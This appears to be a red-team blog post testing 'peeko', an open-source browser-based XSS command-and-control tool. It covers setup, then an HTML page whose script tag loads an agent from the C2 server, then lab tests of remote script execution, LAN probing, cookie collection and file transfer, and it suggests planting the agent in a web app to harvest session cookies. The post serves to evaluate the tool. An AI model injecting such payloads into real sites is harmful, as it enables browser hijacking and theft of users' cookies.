---
layout: post
title:  "Testing peeko - Browser-based C2"
date:   2025-07-21 18:00:00 +0200
categories: tools c2
---
## 1. Introduction

The description of the [b3rito/peeko](https://github.com/b3rito/peeko) tool on its GitHub page is *Browser-based XSS C2 for stealthy internal network exploration via infected browser.*. Words like "browser-based", C2" and "stealthy" in one sentence sounds promising, so let's see, how it actually works.

I tested version 1.1 of this tool, with the last GitHub commit from Apr 14, 2025.

## 2. How it works

This is how this tool can be used for an attack, step by step.

1. The **Attacker** installs and starts the **peeko** server
2. The **Attacker** injects the [peeko/static/agent.js](https://github.com/b3rito/peeko/blob/main/static/agent.js) script into some web page
3. The **Attacker** makes a **Victim** to visit the infected web page

During step 3., the **Victim**'s browser connects to the **peeko** server using web sockets. The **Attacker** then can use **peeko Control Panel** for executing commands in the context of **Victim**'s browser.

## 3. Testing

### 3.1 Installation

The installation went more or less according to instructions in https://github.com/b3rito/peeko?tab=readme-ov-file#quick-start, the only missing step was activation of Python's virtual environment and installation of pre-requisites ([[#Create and activate virtual environment]]).

#### Install pre-requisites (on Ubuntu 24.04)

```bash
sudo apt update
sudo apt install make -y
sudo apt install python3 python3-pip -y
sudo apt install python3.12-venv -y
sudo apt install uvicorn
```

#### Create and activate virtual environment

```bash
python3 -m venv .venv
source .venv/bin/activate
pip3 install -r requirements.txt
```

#### Install peeko

```bash
git clone https://github.com/b3rito/peeko.git && cd peeko
make install
chmod +x gen-cert.sh start.sh
make cert
```

#### Setup peeko

Replace the `SERVER-IP` placeholder with the actual server IP (`10.3.10.99` in my case) in following files:

```bash
nano static/agent.js
nano static/control.html
```

#### Start peeko

```bash
make run
```

It's running!

```
./start.sh
INFO:     Started server process [52506]
INFO:     Waiting for application startup.
INFO:     Application startup complete.
INFO:     Uvicorn running on https://0.0.0.0:8443 (Press CTRL+C to quit)
```

### 3.2. Usage

#### 3.2.1 Opening Control Panel

I opened the **peeko Control Panel** on my host machine in Firefox:

```url
https://10.3.10.99:8443/static/control.html
```

I got a message that the site was not secure, but I could continue and got the Control Panel:

![peeko ControlPanel.jpeg](ControlPanel.jpeg)

I could also see some messages in the **peeko** server:

```
INFO:     198.51.100.2:61900 - "GET /static/control.html HTTP/1.1" 200 OK
INFO:     198.51.100.2:61900 - "GET /favicon.ico HTTP/1.1" 404 Not Found
INFO:     198.51.100.2:61905 - "WebSocket /ws" [accepted]
INFO:     connection open
[+] Attacker connected: 198.51.100.2
```

#### 3.2.2 Creating and opening infected page

The easiest way how to simulate a **Victim** is to simply open the page `https://10.3.10.99:8443/static/infect.html` in the browser on your **Victim**'s machine.

Alternatively you can create simple HTML page and publish it on your web server or just save it as `payload.html` into the `Document` folder on the **Victim**'s machine:

```html
<html>
<body>
	<script src="https://10.3.10.99:8443/static/agent.js"></script>
	<h1>Hello victim!</h1>
</body>
</html>
```

> [!info]
> If you use this method, bear in mind, that the **peeko** server use self-signed certificate, which is not automatically trusted by your web browser, so the request for `https://10.3.10.99:8443/static/agent.js` will fail with an invalid SSL certificate error. The solution is to visit the **peeko** server from the **Victim**'s browser first and tell the browser, that you trust the site.

When you open the infected page, you can immediately see a new entry in the **peeko Control Panel** and there are also following entries in the **peeko** server logs:

```
INFO:     10.3.10.22:52008 - "GET /static/agent.js HTTP/1.1" 200 OK
INFO:     10.3.10.22:52010 - "WebSocket /ws" [accepted]
INFO:     connection open
[+] Victim connected: victim-1 (10.3.10.22)
```

Obviously, the connection last only as long, as the user keeps the page opened in their browser. When they close it, the connection is lost:

```
[-] Victim disconnected: victim-1
INFO:     connection closed
```

#### 3.2.3 Testing peeko features

##### Custom JavaScript to Execute

I tried simple `alert('Hello victim!');` and it worked very well:

![Custom Javascript](JavascriptAlert.png)

Also server logged it:

```
[🚨 From victim-1] [✅ EXEC] Executed: alert('Hello victim!');...
```

##### Target URL

I tried to visit the Control Panel using `https://10.3.10.99:8443/static/control.html` url, but it was blocked by the **Victim**'s browser with an error visible in browser's console: `Access to fetch at 'https://10.3.10.99:8443/static/control.html' from origin 'null' has been blocked by CORS policy: No 'Access-Control-Allow-Origin' header is present on the requested resource`

Server log:

```
[🚨 From victim-1] [❌] Fetch error for https://10.3.10.99:8443/static/control.html: TypeError: Failed to fetch
```

##### Scan LAN Targets

This works a bit differently than you may expect. This is not an `nmap` pr ping sweep type of scan, but it rather tries to contact selected IPs and ports using HTTPS protocol. This is an example of output when I specified IP range `10.3.10.10-12` and port `443`:

```
[🚨 From victim-1] [❌] Fetch error for https://10.3.10.10:443: TypeError: Failed to fetch
[🚨 From victim-1] [❌] Fetch error for https://10.3.10.11:443: TypeError: Failed to fetch
[🚨 From victim-1] [❌] Fetch error for https://10.3.10.12:443: TypeError: Failed to fetch
```


##### Collect Browser Information

Seemed to be working well, but I didn't have enough cookies or other sensitive data in the browser:

```
[COLLECTED INFO]
{
  "useragent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0",
  "platform": "Win32",
  "url": "file:///C:/Users/brandon.stark/Documents/payload.html",
  "referrer": "",
  "plugins": [
    "PDF Viewer",
    "Chrome PDF Viewer",
    "Chromium PDF Viewer",
    "Microsoft Edge PDF Viewer",
    "WebKit built-in PDF"
  ],
  "cookies": "",
  "localStorage": {},
  "sessionStorage": {}
}
```

Log on server:

```
[🚨 From victim-1] [COLLECTED INFO] {"useragent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0","platform":"Win32","url":"file:///C:/Users/brandon.stark/Documents/payload.html","referrer":"","plugins":["PDF Viewer","Chrome PDF Viewer","Chromium PDF Viewer","Microsoft Edge PDF Viewer","WebKit built-in PDF"],"cookies":"","localStorage":{},"sessionStorage":{}}
```

##### File Upload

Working well, the file was stored in the user's `Downloads` folder.

```
[🚨 From victim-1] [FILE RECEIVED] IMG_2457.png (157177 bytes)
```

## 4. Evaluation

### 4.1 Limitations

Unfortunately, there are quite a few limitations of this, not because of this tool, but because how the modern web and internet browsers work.

- The **Target URL** feature works only for sites with the explicitly set HTTP header `Access-Control-Allow-Origin: *`
- The **Scan LAN Targets** feature allows you to scan just HTTPS services running on other machines
- The **Collect Browser Information** shows just cookies for the infected web site and also which are not marked `HttpOnly`

And couple of reports from the Captain Obvious:

- WebSocket connections between the **Victim** and the **peeko** server must be allowed
- When the user closes the infected page, the connection is lost

### 4.2 Practical use cases

Sadly, because of all the limitations, I haven't found many practical attacks which this tool can be used for.

Probably the most promising one is when you get write access to a folder containing some web application and you want to collect sensitive cookies from this web. In such case you can copy the `agent.js` file into the folder containing `.js` files on this web and reference it on some page, which is typically visited by logged in users, like Dashboard or Settings. Then you can simply check the **Auto collect on connect** checkbox in the **peeko Control Panel** and just watch server logs as the users visit the infected page. Again, this works only for cookies without the `HttpOnly` flag.

The **Target URL** feature could be potentially interesting, as you could use it as kind of SSRF and you visit some external webs in the context of the user. Unfortunately, I don't think there are a lot of interesting sites which are explicitly setting the `Access-Control-Allow-Origin: *` HTTP header.

Finally the **Custom JavaScript to Execute** together with the **File Upload** could be probably used in some sophisticated phishing attack, but my lack of imagination doesn't allow me to come with some practical attacks.

## 5. Conclusion

I like the idea, I like the simplicity of the tool, but unfortunately, the limitations of its usage prevents it from making it into my Red Team tool belt.